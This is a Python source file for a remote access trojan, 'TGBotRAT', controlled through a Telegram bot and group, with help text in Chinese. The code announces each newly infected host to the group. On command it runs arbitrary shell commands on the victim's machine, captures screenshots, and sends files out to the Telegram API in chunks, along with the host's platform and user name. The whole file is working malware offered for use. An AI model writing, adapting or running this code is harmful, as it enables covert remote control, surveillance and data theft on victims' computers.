import getpass
import re, os, io
import subprocess
import time
import uuid
import requests
import pyautogui
import platform
import asyncio

class TGBotRAT:
    def __init__(self):
        self.TGBotToken = "TG Token"
        self.ChatName = "@机器人username"
        self.GroupID = "群组ID"
        self.UUID = None
        self.tg_info = None
        self.ReConn_Max = 5
        self.ReConn_Time = 1
        self.UserID = {}
        self.offset = None
        self.max_send_size = 45 * 1024 * 1024
        self.get_platform = platform.platform()

    def help(self):
        return f"""
支持的命令：
    help                                                    查看帮助信息
    getuuids                                                查看所有存活主机信息
    <uuids> <shell options>                                 执行相关指令

    shell options选项如下：
        set uuid <new uuid>                                 设置新的uuid
        screenshot                                          获取实时截图
        upload <current filepath> <target filepath>         上传文件至指定目标地址
        download <target filepath>                          下载指定目标文件（最大支持50MB）
        <shell命令>                                          执行相关系统命令

注意：群组中执行命令格式统一为 {self.ChatName} <支持的命令> <shell options>
"""

    def escape_str(self, res):
        return str(res.replace("\\\\", "\\").replace("\\", "/").replace("_", "\\_").replace(".", "\\.").replace("(", "\\(").replace(")", "\\)").replace("\\\\n","\\n"))

    def get_chat_members(self):
        try:
            data = requests.get(
                f"https://api.telegram.org/bot{self.TGBotToken}/getChatAdministrators?chat_id={self.GroupID}").json()
        except Exception as e:
            self.send_chat_msg({"chatid": self.GroupID, "username": self.UserID,
                                "text": f"获取群内成员失败！\n详情信息如下：{e}"})
        else:
            if data["ok"] and 'result' in data:
                members = data['result']
                # 提取每个成员的用户ID
                for member in members:
                    if not member['user']['is_bot'] and member['user']['id'] not in self.UserID:
                        self.UserID[member['user']['id']] = member['user']["username"]
            else:
                self.send_chat_msg({"chatid": self.GroupID, "username": self.UserID, "text": f"获取群内成员失败！"})

    def getUpdates(self):
        if self.offset is None:
            param = False
        else:
            param = {'offset': self.offset + 1, 'timeout': 30}
        try:
            response = requests.get(f"https://api.telegram.org/bot{self.TGBotToken}/getUpdates",
                                    params=param).json()
        except:
            return False
        else:
            if self.offset is None and response["ok"] and len(response['result']) > 0 and response['result'][-1][
                'update_id'] != "":
                self.offset = response['result'][-1]['update_id']
            if response["ok"] and len(response['result']) > 0:
                updates = []
                for item in response['result']:

                    if 'message' not in item:
                        message = item['edited_message']
                    else:
                        message = item['message']
                    if message['from']['is_bot'] is False and message['from'][
                        'id'] in self.UserID and "text" in message:
                        if message["chat"]["type"] == "supergroup":
                            matches = re.search(fr"{self.ChatName}\s*(.*)", str(message['text']))
                        else:
                            matches = re.search(fr"(.*)", str(message['text']))
                        if matches:
                            matches = matches.group(1).split(" ")
                            if matches[0].replace(" ", "") == str(self.UUID):
                                shell_text = ' '.join(matches[1:]).lstrip(" ")
                                updates.append({'chatid': message['chat']['id'],
                                                'username': [message['from']['id']],
                                                'text': shell_text})
                            elif matches[0].replace(" ", "") == 'getuuids':
                                updates.append({'chatid': message['chat']['id'],
                                                'username': [message['from']['id']],
                                                'text': 'getuuids'})
                        self.offset = response['result'][-1]['update_id']
                return updates
            else:
                return False

    def send_chat_msg(self, updates, before_text="", flag=True):
        try:
            msg = ""
            for item_user in updates["username"]:
                msg += f"@{self.UserID[item_user]} "
            if flag:
                msg += f"\n{before_text}**主机UUID：**\n`{self.UUID}`\n**系统及版本：**`{self.get_platform}`\n**身份：**`{getpass.getuser()}`\n"
            else:
                msg += f"{before_text}\n"
            requests.post(f"https://api.telegram.org/bot{self.TGBotToken}/sendMessage?chat_id={updates['chatid']}&parse_mode=MarkdownV2",
                json={"text": self.escape_str(msg + updates["text"])})
        except:
            pass

    async def send_chat_file(self, updates):
        try:
            msg = ""
            for item_user in updates["username"]:
                msg += self.escape_str(f"@{self.UserID[item_user]} ")
            msg += f"\n**主机UUID：**`{self.UUID}`\n**系统及版本：**`{self.get_platform}`\n" + updates["text"]
            file = {
                "document": (updates['file']['filename'], updates['file']['filecontent'])
            }
            requests.post(
                f"https://api.telegram.org/bot{self.TGBotToken}/sendDocument",
                params={"chat_id": updates['chatid'], "caption": msg, "parse_mode": "MarkdownV2"}, files=file)
        except Exception as e:
            self.send_chat_msg({"chatid": self.GroupID, "username": self.UserID,
                                "text": f"发送失败！\n详情信息如下：{e}"})

    async def handler_center(self, updates):
        for item_user in updates:
            cmd_list = str(item_user["text"]).split(" ")
            sendmsg = {
                "chatid": item_user["chatid"],
                "username": item_user['username']
            }
            if cmd_list[0] == "help":
                sendmsg["type"] = 'Markdown'
                sendmsg["text"] = f"目前支持的命令如下：\n```text\n{self.help()}```"
                self.send_chat_msg(sendmsg)
            elif cmd_list[0] == "getuuids":
                sendmsg["text"] = f"状态：存活！"
                self.send_chat_msg(sendmsg)
            elif cmd_list[0] == "set":
                if cmd_list[1] == "uuid":
                    self.UUID = cmd_list[2].replace(" ", "")
                    sendmsg["text"] = f"已成功更新UUID会话标识！"
                else:
                    sendmsg["text"] = f"该命令 {cmd_list} 并不存在，请使用命令 help 查看语法后操作！"
                self.send_chat_msg(sendmsg)
            elif cmd_list[0] == "screenshot":
                result, flag = self.screenshot()
                if flag:
                    sendmsg["text"] = f"screenshot命令执行成功！"
                    sendmsg["file"] = {
                        "filename": "screenshot.png",
                        "filecontent": result
                    }
                    await asyncio.create_task(self.send_chat_file(sendmsg))
                else:
                    sendmsg["text"] = f"screenshot命令执行失败！\n详细信息如下：{result}"
                    self.send_chat_msg(sendmsg)
            elif cmd_list[0] == "download":
                await asyncio.create_task(self.download(item_user, " ".join(cmd_list[1:]).lstrip(" ")))
            else:
                flag, result = self.command_exec(cmd_list)
                if flag:
                    sendmsg["text"] = f"执行系统命令成功！\n{result}"
                else:
                    sendmsg["text"] = f"执行系统命令失败！\n{result}"
                self.send_chat_msg(sendmsg)

    async def download(self, updates, t_filepath):
        t_filepath = str(t_filepath).replace("\\\\", "\\").replace("\\", "/")
        try:
            if "/" not in t_filepath:
                basepath = os.getcwd()
            else:
                basepath = os.path.dirname(t_filepath)
            filepath = os.path.join(basepath, os.path.basename(t_filepath))
            sendmsg = {
                "chatid": updates["chatid"],
                "username": updates['username'],
                "file": {}
            }
            filenamelist = os.path.basename(t_filepath).split(".")
            with open(file=filepath, mode="rb") as f:
                filesize = os.path.getsize(filepath)
                i = 1
                while True:
                    chunk = f.read(self.max_send_size)
                    if not chunk:
                        break
                    sendmsg[
                        'text'] = f"**文件名：**`{filepath}`\n**当前下载状态：**已完成 {str(i)}/{'1' if int(filesize / self.max_send_size) <= 1 else str(int(filesize / self.max_send_size)) + '（文件过大，已自动开启分片下载，请自行下载后合并！）'}"
                    sendmsg['file']['filename'] = self.escape_str(os.path.basename(t_filepath) if int(filesize / self.max_send_size) <= 1 else f"{filenamelist[:-1][0]}_({i})_.{filenamelist[-1:][0]}")
                    sendmsg['file']['filecontent'] = chunk
                    await asyncio.create_task(self.send_chat_file(sendmsg))
                    i += 1
        except Exception as e:
            self.send_chat_msg(
                {"chatid": self.GroupID, "username": self.UserID, "text": f"下载失败！具体错误如下：\n```shell\n{e}```"})

    def screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            img_byte_arr.seek(0)
            return img_byte_arr, True
        except Exception as e:
            return e, False

    def command_exec(self, command):
        command_shell = " ".join(command).lstrip(" ").replace("\\\\","\\").replace("\\","/")
        pf = re.search("^([a-zA-Z]:)", command[0])
        try:
            if command[0] == "cd" or pf and "&&" not in command:
                if pf:
                    newdir = pf.group(1)
                else:
                    newdir = "".join(command[1:]).lstrip(" ")
                os.chdir(newdir)
                return True, "当前所在路径\n```shell\n" + os.getcwd() + "```"
            else:
                result = subprocess.Popen(command_shell, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output, error = result.communicate()
                if output:
                    return True, "```shell\n" + output.decode('gbk', errors='ignore') + "```"
                if error:
                    return False, "```shell\n" + error.decode('gbk', errors='ignore') + "```"
                return True, "执行完毕！"
        except Exception as e:
            return False, f"执行失败！\n系统错误详情：```shell\n{e}```"

    def main(self):
        self.UUID = uuid.uuid4()
        flag = False
        while True:
            self.get_chat_members()
            if not flag:
                flag = True
                self.send_chat_msg({"chatid": self.GroupID, "username": self.UserID, "text": ""},before_text="新的主机上线！\n")
            updates = self.getUpdates()
            if updates:
                asyncio.run(self.handler_center(updates))
            time.sleep(self.ReConn_Time)


if __name__ == '__main__':
    TGBotRAT().main()
